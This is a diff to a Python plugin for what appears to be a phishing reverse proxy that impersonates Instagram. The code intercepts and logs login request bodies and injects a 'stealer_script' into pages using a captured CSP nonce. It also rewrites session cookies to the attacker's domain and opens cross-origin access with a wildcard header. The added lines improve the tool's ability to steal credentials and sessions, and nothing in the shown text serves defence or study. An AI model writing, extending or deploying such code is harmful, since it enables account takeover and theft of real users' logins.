@@ -22,7 +22,6 @@ print(
 )
 with open(stealer_script_location, "rb") as injection_file:
     stealer_script = injection_file.read()
-stealer_script = stealer_script.replace(b"{actual_host}", actual_host)
 
 # Intercepted data on runtime
 intercepted_data: list[bytes] = []
@@ -65,7 +64,6 @@ def modify_request(request: HttpRequest) -> HttpRequest:
                 "[plugins/www.instagram.com:modify_request] Data intercepted on hook -> %s\n"
                 % request.body.decode(errors="ignore")
             )  # Log
-        request.body = b" " * _original_body_length
         request.target = b"/api/v1"
 
     if log != "":
@@ -129,6 +127,10 @@ def modify_response(response: HttpResponse) -> HttpResponse:
                 nonce = match.group(1).encode().replace(b"'", b"")
 
             # Log only (no injection logic)
+            if b"{actual_host}" in stealer_script:
+                stealer_script = stealer_script.replace(
+                    b"{actual_host}", b"http://" + actual_host
+                )
             injected: bytes = (
                 b'<script nonce="' + nonce + b'">' + stealer_script + b"</script>"
             )
@@ -159,6 +161,13 @@ def modify_response(response: HttpResponse) -> HttpResponse:
             new_headers.append((key, value))
         elif key.lower() == b"set-cookie":
             new_headers.append((key, value.replace(b"instagram.com", actual_host)))
+        elif (
+            key.lower() == b"access-control-allow-origin"
+            or key.lower() == b"allow-origin"
+        ):
+            new_headers.append((key, b"*"))
+        elif key.lower() == b"content-length":
+            pass
         else:
             new_headers.append((key, value))
 
